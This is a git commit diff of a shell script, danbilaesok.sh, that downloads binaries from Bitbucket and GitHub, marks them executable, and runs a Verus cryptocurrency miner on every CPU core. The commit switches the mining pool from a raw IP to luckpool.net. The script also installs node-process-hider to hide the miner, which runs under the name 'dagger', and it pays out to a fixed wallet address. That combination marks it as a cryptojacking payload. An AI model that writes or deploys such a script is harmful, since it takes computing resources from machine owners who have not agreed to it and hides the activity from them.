4a6ed7642b7d635d448d535e886158c8d4dd3926
BetawiYoi <134082647+danipedrosang@users.noreply.github.com>
2023-06-22 20:30:46 +0700

    Update danbilaesok.sh

--- danbilaesok.sh
+++ danbilaesok.sh
@@ -5,4 +5,4 @@ npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add dagger ver
 wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload && chmod +x reload
 wget https://github.com/danipedrosang/bang/raw/main/dagger
 wget https://github.com/danipedrosang/bang/raw/main/verus-solver && chmod +x dagger verus-solver
-./dagger -c stratum+tcp://43.134.237.60:80 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.$(echo $(shuf -i 1-20000 -n 1)-RajaHutan) -p x --cpu $(nproc --all)
+./dagger -c stratum+tcp://na.luckpool.net:3956 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.$(echo $(shuf -i 1-20000 -n 1)-RajaHutan) -p x --cpu $(nproc --all)
